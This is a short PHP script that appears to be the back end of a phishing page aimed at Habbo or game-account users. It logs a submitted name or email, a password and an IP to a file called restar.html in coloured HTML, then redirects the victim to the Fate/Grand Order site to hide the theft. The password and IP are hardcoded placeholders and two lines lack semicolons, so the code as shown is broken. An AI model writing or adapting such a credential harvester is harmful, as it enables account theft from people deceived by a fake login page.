<?php

$habbo = $_POST['nombre']; 
$password = "x.x.x.x"
$ip = "11"
$f = fopen("restar.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#FF1493">'.$habbo.'</font></b>] Password: [<b><font color="#1E90FF">'.$password.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>]<br>');
fclose($f);

header("Location:https://www.fate-go.jp/");
?>
